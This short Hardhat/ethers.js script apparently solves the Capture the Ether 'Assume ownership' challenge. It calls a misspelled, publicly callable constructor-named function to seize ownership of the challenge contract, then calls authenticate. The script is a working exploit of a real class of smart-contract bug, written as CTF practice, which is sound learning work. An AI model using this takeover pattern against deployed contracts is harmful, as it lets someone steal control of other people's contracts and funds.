const { ethers } = require("hardhat");

async function main() {
    //The contract abi
    const abi = [
        {"constant":false,"inputs":[],"name":"AssumeOwmershipChallenge","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
        {"constant":false,"inputs":[],"name":"authenticate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
        {"constant":true,"inputs":[],"name":"isComplete","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}
    ];

    //The contract address - Just copy it from the CTE challenge page
    const contractAddress = "0x799C7E7e0B3ee54BA863E883FB06d8Df79F93903";

    //Get your account
    const [signer] = await ethers.getSigners();
    console.log("SIGNER: ", signer.address)

    //Get the contract and connect using your account
    var cteContract = new ethers.Contract(contractAddress, abi, signer);

    //Assume ownership
    let assumeOwnershipTX = await cteContract.AssumeOwmershipChallenge();
    let assumeOwnershipTXReceipt = await assumeOwnershipTX.wait();
    console.log("WE'VE ASSUMED OWNERSHIP: ", assumeOwnershipTXReceipt);
    console.log("---------------------------");

    //Now, we just have to authenticate ourselves
    let authenticateTx = await cteContract.authenticate();
    let authenticateTxReceipt = await authenticateTx.wait();
    console.log("WE ARE AUTHENTICATED: ", authenticateTxReceipt);
    console.log("---------------------------");
}

main()
.then(() => process.exit(0))
.catch((error) => {
    console.log(error);
    process.exit(1);
});